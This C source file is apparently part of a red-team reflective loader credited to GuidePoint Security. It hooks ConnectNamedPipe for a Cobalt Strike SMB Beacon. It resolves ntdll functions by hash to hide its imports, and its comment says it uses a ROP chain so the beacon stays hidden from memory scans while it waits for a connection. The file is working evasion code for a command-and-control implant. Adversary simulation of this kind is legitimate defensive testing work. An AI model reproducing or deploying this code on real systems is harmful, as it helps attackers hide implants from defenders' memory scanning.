/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack SimulatioN
 *
**/

#include "Common.h"

/* CTL Codes */
#define FSCTL_PIPE_LISTEN		CTL_CODE( FILE_DEVICE_NAMED_PIPE, 2, METHOD_BUFFERED, FILE_ANY_ACCESS )

typedef struct
{
	D_API( RtlNtStatusToDosError );
	D_API( RtlSetLastWin32Error );
	D_API( NtFsControlFile );
} API ;

/* API Hashes */
#define H_API_RTLNTSTATUSTODOSERROR	0x39d7c890 /* RtlNtStatusToDosError */
#define H_API_RTLSETLASTWIN32ERROR	0xfd303374 /* RtlSetLastWin32Error */
#define H_API_NTFSCONTROLFILE		0xecdfd601 /* NtFsControlFile */

/* LIB Hashes */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */	

/*!
 *
 * Purpose:
 *
 * Awaits for a connection for a SMB Beacon, and
 * creates a ROP chain to hide itself from any
 * memory scans.
 *
!*/
D_SEC( D ) BOOL WINAPI ConnectNamedPipe_Hook( _In_ HANDLE hNamedPipe, _Inout_ LPOVERLAPPED lpOverlapped )
{
	API			Api;
	IO_STATUS_BLOCK		Isb;

	NTSTATUS		Nst = STATUS_UNSUCCESSFUL;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	Api.RtlNtStatusToDosError = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLNTSTATUSTODOSERROR );
	Api.RtlSetLastWin32Error  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLSETLASTWIN32ERROR );
	Api.NtFsControlFile       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTFSCONTROLFILE );

	Nst = Api.NtFsControlFile(
			hNamedPipe,
			NULL,
			NULL,
			NULL,
			&Isb,
			FSCTL_PIPE_LISTEN,
			NULL,
			0,
			NULL,
			0
	);

	if ( Nst == STATUS_PENDING ) {
		Nst = NtWaitForSingleObjectObf(
				hNamedPipe,
				FALSE,
				NULL
		);

		if ( NT_SUCCESS( Nst ) ) { 
			Nst = Isb.Status;
		};
	};
	if ( ! NT_SUCCESS( Nst ) ) {
		Api.RtlSetLastWin32Error( Api.RtlNtStatusToDosError( Nst ) );
	};

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Isb, sizeof( Isb ) );

	return NT_SUCCESS( Nst ) ? TRUE : FALSE;
};
